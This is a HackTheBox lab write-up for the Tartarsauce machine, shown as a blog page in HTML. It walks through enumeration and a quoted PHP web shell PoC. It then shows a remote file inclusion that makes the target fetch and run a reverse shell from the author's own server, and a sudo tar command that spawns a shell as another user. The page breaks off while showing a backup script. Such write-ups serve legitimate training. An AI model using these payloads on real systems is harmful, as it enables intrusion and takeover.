@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Tartarsauce | Initial nmap root@SittingDucks:~# nmap -p- -sV -sC 10.10.10.88 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-11 04:58 GMT Nmap scan...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Tartarsauce</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-02-05 06:23:00+00:00">Wed 05 February 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Tartarsauce.html">Tartarsauce</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Tartarsauce.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1 id="initial-nmap">Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -p- -sV -sC <span class="m">10</span>.10.10.88
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-11 04:58 GMT</span>
+<span class="go">Nmap scan report for 10.10.10.88</span>
+<span class="go">Host is up (0.018s latency).</span>
+<span class="go">Not shown: 65534 closed ports</span>
+<span class="go">PORT   STATE SERVICE VERSION</span>
+<span class="go">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
+<span class="go">| http-robots.txt: 5 disallowed entries </span>
+<span class="go">| /webservices/tar/tar/source/ </span>
+<span class="go">| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ </span>
+<span class="go">|_/webservices/developmental/ /webservices/phpmyadmin/</span>
+<span class="go">|_http-server-header: Apache/2.4.18 (Ubuntu)</span>
+<span class="go">|_http-title: Landing Page</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 37.17 seconds</span>
+</pre></div>
+
+
+<p>nmap shows there is a robots.txt file which I was able to confirm from a web browser:</p>
+<p><img alt="" src="../images//tartar-robots.png"></p>
+<p>Only monstra directory gave me a result. Doing some research on the web, I found that Monstra is a lightweight cms. </p>
+<p><img alt="" src="../images//tartar-monstra.png"></p>
+<p>I explored the page source and all the links. The "logged in" hyperlink shows a login page:</p>
+<p><img alt="" src="../images//tartar-monstra-login.png"></p>
+<p>Before trying anything I always like to try simple things so I tried to login with the most standard credentials admin/admin, and believe it or not I am in!</p>
+<p><img alt="" src="../images//tartar-monstra-loggedin.png"></p>
+<p>All seemed too easy to be honest. In fact, I spent a huge amount on what eventually turned out to be a rabbit hole. Using searchsploit I found exploit 43348 which was suitable for my scenario:</p>
+<div class="highlight"><pre><span></span><span class="go">Proof of Concept</span>
+<span class="go">Steps to Reproduce:</span>
+
+<span class="go">1. Login with a valid credentials of an Editor</span>
+<span class="go">2. Select Files option from the Drop-down menu of Content</span>
+<span class="go">3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)</span>
+
+<span class="go">           &lt;?php</span>
+
+<span class="gp"> $</span><span class="nv">cmd</span><span class="o">=</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">]</span><span class="p">;</span>
+
+<span class="go"> system($cmd);</span>
+
+<span class="go"> ?&gt;</span>
+
+<span class="go">4. Click on Upload</span>
+<span class="go">5. Once the file is uploaded Click on the uploaded file and add ?cmd= to</span>
+<span class="go">the URL followed by a system command such as whoami,time,date etc.</span>
+</pre></div>
+
+
+<p>However, I was unable to upload or modify anything in the portal so I think that we just have read permissions although we have logged in with the admin user. I think this is just a trick from the author of the box.</p>
+<p>After being stuck there for a while I went back to enumerate and I decided to scan the <strong><em>webservices</em></strong> directory I found earlier with gobuster.</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> gobuster dir -u http://10.10.10.88/webservices -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">20</span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://10.10.10.88/webservices</span>
+<span class="go">[+] Threads:        20</span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/02/11 05:36:09 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/wp (Status: 301)</span>
+</pre></div>
+
+
+<p>I got an immediate hit on the <strong><em>wp</em></strong> directory which could indicate we are dealing with a wordpress site. This was confirmed when I browsed to that page. Although the site seems broken for some reasons we can still see that is powered by wordpress.</p>
+<p><img alt="" src="../images//tartar-wp1.png"></p>
+<p>The first thing I do when I find wordpress is involved is to use <code>wpscan</code> to enumerate the site. Worpress is very popular to have a huge amount of plugins which may present potential vulnerabilities that we can exploit. I lunched the command with the <strong><em>-e ap</em></strong> (enumerate all plugins) option.</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> wpscan -e ap --url http://10.10.10.88/webservices/wp                                                                                                                             
+<span class="go">_______________________________________________________________                                                                                                                               </span>
+<span class="go">         __          _______   _____                                                                                                                                                          </span>
+<span class="go">         \ \        / /  __ \ / ____|                                                                                                                                                         </span>
+<span class="go">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                        </span>
+<span class="go">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \                                                                                                                                         </span>
+<span class="go">            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                        </span>
+<span class="go">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                        </span>
+
+<span class="go">         WordPress Security Scanner by the WPScan Team                                                                                                                                        </span>
+<span class="go">                         Version 3.7.8                                                                                                                                                        </span>
+<span class="go">       Sponsored by Automattic - https://automattic.com/                                                                                                                                      </span>
+<span class="go">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                        </span>
+<span class="go">_______________________________________________________________                                                                                                                               </span>
+
+<span class="go">[+] URL: http://10.10.10.88/webservices/wp/                                                                                                                                                   </span>
+<span class="go">[+] Started: Tue Feb 11 05:52:01 2020</span>
+
+<span class="go">Interesting Finding(s):</span>
+
+<span class="go">[+] http://10.10.10.88/webservices/wp/</span>
+<span class="go"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span>
+<span class="go"> | Found By: Headers (Passive Detection)</span>
+<span class="go"> | Confidence: 100%</span>
+
+<span class="go">[+] http://10.10.10.88/webservices/wp/xmlrpc.php</span>
+<span class="go"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="go"> | Confidence: 100%</span>
+<span class="go"> | References:</span>
+<span class="go"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span>
+<span class="go"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span>
+<span class="go"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span>
+<span class="go"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span>
+<span class="go"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span>
+
+<span class="go">[+] http://10.10.10.88/webservices/wp/readme.html</span>
+<span class="go"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="go"> | Confidence: 100%</span>
+
+<span class="go">[+] http://10.10.10.88/webservices/wp/wp-cron.php</span>
+<span class="go"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="go"> | Confidence: 60%</span>
+<span class="go"> | References:</span>
+<span class="go"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span>
+<span class="go"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span>
+
+<span class="go">[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).</span>
+<span class="go"> | Found By: Emoji Settings (Passive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/, Match: &#39;wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4&#39;</span>
+<span class="go"> | Confirmed By: Meta Generator (Passive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/, Match: &#39;WordPress 4.9.4&#39;</span>
+
+<span class="go">[i] The main theme could not be detected.</span>
+
+<span class="go">[+] Enumerating All Plugins (via Passive Methods)</span>
+
+<span class="go">[i] No plugins Found.</span>
+
+<span class="go">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span>
+<span class="go">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span>
+
+<span class="go">[+] Finished: Tue Feb 11 05:52:03 2020</span>
+<span class="go">[+] Requests Done: 23</span>
+<span class="go">[+] Cached Requests: 4</span>
+<span class="go">[+] Data Sent: 6.095 KB</span>
+<span class="go">[+] Data Received: 37.379 KB</span>
+<span class="go">[+] Memory used: 144.039 MB</span>
+<span class="go">[+] Elapsed time: 00:00:01</span>
+</pre></div>
+
+
+<p>Nothing really valuable in the output and no plugins were found which is very unusual. From the output I also notices the plugins enumerations happened <strong><em>via Passive Methods</em></strong>. Looking at the <code>wpscan</code> instructions I found out that there are two other methods: mixed and aggressive.</p>
+<p>So I decide to give it a try with aggressive mode adding this option to the command: <strong><em>--plugins-detection aggressive</em></strong>.</p>
+<p>This time I got some results:</p>
+<div class="highlight"><pre><span></span><span class="go">[+] Enumerating All Plugins (via Aggressive Methods)                                                                                                                                          </span>
+<span class="go"> Checking Known Locations - Time: 00:05:51 &lt;==========================================================================================================&gt; (84849 / 84849) 100.00% Time: 00:05:51</span>
+<span class="go">[+] Checking Plugin Versions (via Passive and Aggressive Methods)                                                                                                                             </span>
+
+<span class="go">[i] Plugin(s) Identified:                                                                                                                                                                     </span>
+
+<span class="go">[+] akismet                                                                                                                                                                                   </span>
+<span class="go"> | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/                                                                                                                    </span>
+<span class="go"> | Last Updated: 2019-11-13T20:46:00.000Z                                                                                                                                                     </span>
+<span class="go"> | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt</span>
+<span class="go"> | [!] The version is out of date, the latest version is 4.1.3</span>
+<span class="go"> |</span>
+<span class="go"> | Found By: Known Locations (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200</span>
+<span class="go"> |</span>
+<span class="go"> | Version: 4.0.3 (100% confidence)</span>
+<span class="go"> | Found By: Readme - Stable Tag (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt</span>
+<span class="go"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt</span>
+
+<span class="go">[+] brute-force-login-protection</span>
+<span class="go"> | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/</span>
+<span class="go"> | Latest Version: 1.5.3 (up to date)</span>
+<span class="go"> | Last Updated: 2017-06-29T10:39:00.000Z</span>
+<span class="go"> | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt</span>
+<span class="go"> |</span>
+<span class="go"> | Found By: Known Locations (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403</span>
+<span class="go"> |</span>
+<span class="go"> | Version: 1.5.3 (100% confidence)</span>
+<span class="go"> | Found By: Readme - Stable Tag (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt</span>
+<span class="go"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt</span>
+
+<span class="go">[+] gwolle-gb</span>
+<span class="go"> | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/</span>
+<span class="go"> | Last Updated: 2020-02-01T14:42:00.000Z</span>
+<span class="go"> | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt</span>
+<span class="go"> | [!] The version is out of date, the latest version is 3.1.9</span>
+<span class="go"> |</span>
+<span class="go"> | Found By: Known Locations (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200</span>
+<span class="go"> |</span>
+<span class="go"> | Version: 2.3.10 (100% confidence)</span>
+<span class="go"> | Found By: Readme - Stable Tag (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt</span>
+<span class="go"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span>
+<span class="go"> |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt</span>
+
+<span class="go">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span>
+<span class="go">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span>
+
+<span class="go">[+] Finished: Tue Feb 11 06:04:15 2020</span>
+<span class="go">[+] Requests Done: 84864</span>
+<span class="go">[+] Cached Requests: 31</span>
+<span class="go">[+] Data Sent: 22.509 MB</span>
+<span class="go">[+] Data Received: 11.414 MB</span>
+<span class="go">[+] Memory used: 296.926 MB</span>
+<span class="go">[+] Elapsed time: 00:06:01</span>
+</pre></div>
+
+
+<p>Searchsploit gave me few results but not related to the versions of the plugins I found. I started looking online for some other exploits but no luck. This is where I got stuck for a while but I was sure this was the right path as I read something on a htb forum where people talked about vulnerable wp plugins on tartarsauce. Thus I went back and started looking at the readme files of the plugins and after a while I found this on the <code>gwolle</code> readme:</p>
+<div class="highlight"><pre><span></span><span class="go">== Changelog ==</span>
+
+<span class="go">= 2.3.10 =</span>
+<span class="go">* 2018-2-12</span>
+<span class="go">* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D</span>
+</pre></div>
+
+
+<p>This reminded me a good old lesson that for these kind of activities every small detail is vital!</p>
+<p>Searchsploit found an RFI exploit (38861) for this version of <code>gwolle</code>. This is an extract of the exploit:</p>
+<div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="ss">&quot;abspath&quot;</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">being</span><span class="w"> </span><span class="n">properly</span><span class="w"> </span><span class="n">sanitized</span><span class="w"> </span><span class="k">before</span><span class="w"> </span><span class="n">being</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">require</span><span class="p">()</span><span class="w"> </span><span class="k">function</span><span class="p">.</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">include</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">named</span><span class="w"> </span><span class="s1">&#39;wp-load.php&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">execute</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">vulnerable</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="p">.</span><span class="w"> </span><span class="ow">In</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="n">needs</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">place</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="s1">&#39;wp-load.php&#39;</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">includes</span><span class="w"> </span><span class="n">server</span><span class="s1">&#39;s URL into request:</span>
+
+<span class="s1">http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]</span>
+
+<span class="s1">In order to exploit this vulnerability &#39;</span><span class="n">allow_url_include</span><span class="err">&#39;</span><span class="w"> </span><span class="n">shall</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="mf">1.</span><span class="w"> </span><span class="n">Otherwise</span><span class="p">,</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">still</span><span class="w"> </span><span class="k">include</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="k">execute</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">code</span><span class="p">.</span><span class="w"> </span>
+
+<span class="n">Successful</span><span class="w"> </span><span class="n">exploitation</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">lead</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">entire</span><span class="w"> </span><span class="n">WordPress</span><span class="w"> </span><span class="n">installation</span><span class="w"> </span><span class="n">compromise</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">even</span><span class="w"> </span><span class="n">lead</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">entire</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">compromise</span><span class="p">.</span><span class="w"> </span>
+</pre></div>
+
+
+<p>With this in mind, I copied a php webshell from my kali box (/usr/share/laudanum/php/php-reverse-shell.php), I modified the content and updated the IP address (my kali box IP) and a port (I used 443) and renamed it as <strong><em>wp-load.php</em></strong>. I also started a simple HTTP webserver with python in the directory where <strong><em>wp-load.php</em></strong> is located. I then modified the URL to be exactly like this:</p>
+<p><code>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/wp-load.php)</code></p>
+<p>At this stage I activate a netcat listener on port 443 and I launched the URL. I got no shell back as expected. Looking at the python web server I see this:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> python -m SimpleHTTPServer 
+<span class="go">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+<span class="go">10.10.10.88 - - [11/Feb/2020 06:51:20] code 404, message File not found</span>
+<span class="go">10.10.10.88 - - [11/Feb/2020 06:51:20] &quot;GET /wp-load.phpwp-load.php HTTP/1.0&quot; 404 -</span>
+</pre></div>
+
+
+<p>The file is not found because wp-load.php is appended to the URL so I remove that bit and launched this URL instead</p>
+<p><code>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/</code></p>
+<p>This time it worked!</p>
+<p>I got a simple shell and I used the procedure found in this <a href="http://sittingducks.io/From%20basic%20shell%20to%20fully%20interactive.html">cheatsheet</a> to upgrade to a full interacive pty shell.</p>
+<p>As shown below I got in as the <strong>www-data</strong> user.</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@TartarSauce:/$</span> <span class="nb">cd</span> /home
+<span class="gp">www-data@TartarSauce:/home$</span> ls -l
+<span class="go">total 4</span>
+<span class="go">drwxrw---- 5 onuma onuma 4096 Feb 21  2018 onuma</span>
+<span class="gp">www-data@TartarSauce:/home$</span> <span class="nb">cd</span> onuma
+<span class="go">bash: cd: onuma: Permission denied</span>
+</pre></div>
+
+
+<p>Moving to the home directory I see another user (<strong>onuma</strong>) but I am unable to get to his home directory to get the flag because I don't have permissions. I need to find a way to escalate privileges to <strong>onuma</strong>.</p>
+<p>At this stage I decided to run an enumeration script named Linux-Smart-Enumeration (lse) which is similar to the popular LinEnum but unlike it, it tries to gradualy expose the information depending on its importance from a privesc point of view. I downloaded the script in the box first (specifically on /dev/shm since I can write there).</p>
+<p>Analyzing the output I noticed this potentially useful information:</p>
+<div class="highlight"><pre><span></span><span class="go">[!] sud010 Can we list sudo commands without a password?................... yes!               </span>
+<span class="go">---                                                                                                                                                                                           </span>
+<span class="go">Matching Defaults entries for www-data on TartarSauce:                                         </span>
+<span class="go">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                         </span>
+
+<span class="go">User www-data may run the following commands on TartarSauce:                                                                                                                                  </span>
+<span class="go">    (onuma) NOPASSWD: /bin/tar              </span>
+</pre></div>
+
+
+<p>the user <strong>www-data</strong> can run the <code>tar</code> command as <strong>onuma</strong> without password. Let's see what can we do about it.</p>
+<p><a href="https://gtfobins.github.io/">GTFOBins</a> is a great resource to find out about these things, in fact the site contains a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<p>This is what we can see for <code>tar</code> combined with <code>sudo</code>:</p>
+<p><img alt="" src="../images//tartar-tar-sudo.png"></p>
+<p>We know that in our case we’ll need to run this with as <strong>onuma</strong> so the command will be the following:</p>
+<p><code>sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></p>
+<p>To understand more about the above command, let's break it down:</p>
+<ul>
+<li>The <code>-c</code> option creates a new archive;</li>
+<li>The <code>-f /dev/null</code> option uses the /dev/null black hole;</li>
+<li>The extra <code>/dev/null</code> is the location we’re saving the archive to;</li>
+<li>The <code>--checkpoint=1</code> option tells tar to display progress messages every X records.</li>
+<li>The <code>--checkpoint-action=exec=/bin/sh</code> options tells tar to run /bin/sh at each checkpoint, essentially giving us a shell.</li>
+</ul>
+<p>When I ran the command I get the expected result:</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@TartarSauce:/$</span> sudo -u onuma tar -cf /dev/null /dev/null --checkpoint<span class="o">=</span><span class="m">1</span> --checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>/bin/sh
+<span class="go">tar: Removing leading `/&#39; from member names</span>
+<span class="gp">$</span> whoami
+<span class="go">onuma</span>
+</pre></div>
+
+
+<p>Now, I have again a limited shell so again I use the procedure found in this <a href="http://localhost:8000/From%20basic%20shell%20to%20fully%20interactive.html">cheatsheet</a> to upgrade to a full interacive pty shell.</p>
+<p>Running the lse script again and scrutinizing it I noticed the following entry under the <strong>systemd timers</strong> section:</p>
+<div class="highlight"><pre><span></span><span class="go">NEXT                         LEFT         LAST                         PASSED       UNIT                         ACTIVATES</span>
+<span class="go">Wed 2020-02-12 00:57:29 EST  2min 5s left Wed 2020-02-12 00:52:29 EST  2min 54s ago backuperer.timer             backuperer.service              </span>
+</pre></div>
+
+
+<p><code>backuperer</code> does not sound as a standard service and the LEFT and PASSED columns indicate that the service may be running every 5 minutes.</p>
+<p><strong>systemd timers</strong> are basically a way of doing cronjob on systemd services. </p>
+<p>Looking for <strong>backuperer</strong> I found a bash script in <code>/usr/sbin</code>:</p>
+<div class="highlight"><pre><span></span><span class="err">onuma@TartarSauce:/dev/shm$ ls -l /usr/sbin/backuperer</span>
+<span class="err">-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer</span>
+</pre></div>
+
+
+<p>this is the content of the script:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+
+<span class="c1">#-------------------------------------------------------------------------------------</span>
+<span class="c1"># backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ</span>
+<span class="c1"># ONUMA Dev auto backup program</span>
+<span class="c1"># This tool will keep our webapp backed up incase another skiddie defaces us again.</span>
+<span class="c1"># We will be able to quickly restore from a backup in seconds ;P</span>
+<span class="c1">#-------------------------------------------------------------------------------------</span>
+
+<span class="c1"># Set Vars Here</span>
+<span class="nv">basedir</span><span class="o">=</span>/var/www/html
+<span class="nv">bkpdir</span><span class="o">=</span>/var/backups
+<span class="nv">tmpdir</span><span class="o">=</span>/var/tmp
